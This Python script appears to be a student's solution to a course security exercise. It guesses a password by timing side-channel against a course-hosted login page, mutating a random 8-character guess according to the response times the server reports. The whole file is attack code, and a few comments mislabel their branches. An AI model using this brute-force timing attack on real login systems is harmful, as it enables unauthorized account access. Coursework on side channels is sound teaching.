#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# import the ability to make random strings
import random
# i had to download and install the Requests library for this, but I figured that was okay considering
# it's such a widely used library. plus, it works well :)
import requests

# initialize the url
url = "http://cs.olemiss.edu/~jones/csci343/pwd/index.php?username=considerateGiraffe&password="

# create a random 8-char alphanumeric password
password = ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for i in range(8))

# initialize a compare value for later
secondValue = -1

# create a sentinel value
test = 0

# if-statement to check if it works
while (test == 0):
    # get the return value from the website
    websiteReturn = requests.get(url+password)
    websiteReturn = websiteReturn.text
    if (websiteReturn == "SUCCESSFUL"):
        print ('Your password is '+password)
        test = -1
    else:
        # make the return value a list for which index one being the actual number
        websiteReturn = websiteReturn.split(" ")
        # if it took more time than the last time, keep the change and make another one
        if (int(websiteReturn[0]) > secondValue):
            randomIndex = random.choice('01234567')
            randomIndex = int(randomIndex)
            listPassword = list(password)
            changedCharacter = listPassword[randomIndex]
            listPassword[randomIndex] = random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz')
            password = ''.join(listPassword)
            secondValue = int(websiteReturn[0])
            # print the current guess plus the time it returns to make sure the code is running properly
            print(password + ' - ' + str(secondValue) + ' ms')
        # if it took less time, undo the previous change and make a change to a different index
        elif (int(websiteReturn[0]) == secondValue):
            # undo the change
            listPassword[randomIndex] = changedCharacter
            # choose another random index and change it
            randomIndex = random.choice('01234567')
            randomIndex = int(randomIndex)
            changedCharacter = listPassword[randomIndex]
            listPassword[randomIndex] = random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz')
            password = ''.join(listPassword)
            secondValue = int(websiteReturn[0])
            # print the current guess plus the time it returns to make sure the code is running properly
            print(password + ' - ' + str(secondValue) + ' ms')
        # if it took the same time, change that index back
        else:
            # undo the change
            listPassword[randomIndex] = changedCharacter
            password = ''.join(listPassword)
